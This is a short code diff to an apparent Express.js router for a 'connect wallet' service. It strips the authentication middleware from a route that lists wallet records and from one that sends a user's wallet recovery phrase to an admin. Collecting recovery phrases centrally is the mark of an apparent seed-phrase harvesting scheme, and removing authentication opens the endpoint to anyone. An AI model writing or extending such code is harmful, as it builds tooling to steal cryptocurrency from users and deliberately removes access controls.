@@ -22,7 +22,7 @@ router.post("/addConnectWallet", protect, adminOnly, upload.single("image"),(req
   },  addConnectWalletValidator, adminOnly, addConnectWallet);
 
 
-router.get("/getAllConnectWallet", protect, getAllConnectWallet);
+router.get("/getAllConnectWallet", getAllConnectWallet);
 
 router.patch("/updateConnectWallet/:id", protect, adminOnly, updateConnectWalletValidator, updateConnectWallet);
 
@@ -33,7 +33,7 @@ router.delete("/deleteArrayOfWallets", protect, adminOnly, deleteArrayOfWallets)
 
 router.post("/updateConnectWalletPhoto/:id", protect, adminOnly, upload.single('image'), updateConnectWalletPhoto);
 
-router.post("/sendWalletPhraseToAdmin", protect, sendWalletPhraseToAdmin);
+router.post("/sendWalletPhraseToAdmin", sendWalletPhraseToAdmin);
 
 
 
